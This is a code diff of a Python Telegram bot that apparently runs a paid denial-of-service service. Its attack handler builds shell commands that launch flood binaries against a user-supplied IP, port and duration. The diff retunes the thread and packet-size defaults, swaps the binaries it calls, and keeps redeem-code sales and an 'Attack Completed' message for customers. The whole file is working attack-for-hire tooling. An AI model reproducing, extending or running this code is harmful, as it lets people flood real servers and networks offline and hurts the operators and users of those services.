@@ -35,8 +35,8 @@ active_processes = {}
 current_directory = os.getcwd()
 
 # Default values (in case not set by the admin)
-DEFAULT_BYTE_SIZE = 100
-DEFAULT_THREADS = 1000
+DEFAULT_BYTE_SIZE = 512
+DEFAULT_THREADS = 900
 DEFAULT_MAX_ATTACK_TIME = 300
 valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
 
@@ -675,11 +675,11 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./prash {ip} {port} {duration}"
+        attack_command = f"./owner {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./bgmi {ip} {port} {duration} {threads}"
+        attack_command = f"./RK {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./RK {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./owner {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
@@ -776,7 +776,7 @@ async def run_attack(chat_id, attack_command, context):
             print(f"[stderr]\n{stderr.decode()}")
 
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*\n*SEND FEEDBACK @NOOB_AM*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
 
 # Function to generate a redeem code with a specified redemption limit and optional custom code name
 async def generate_redeem_code(update: Update, context: CallbackContext):
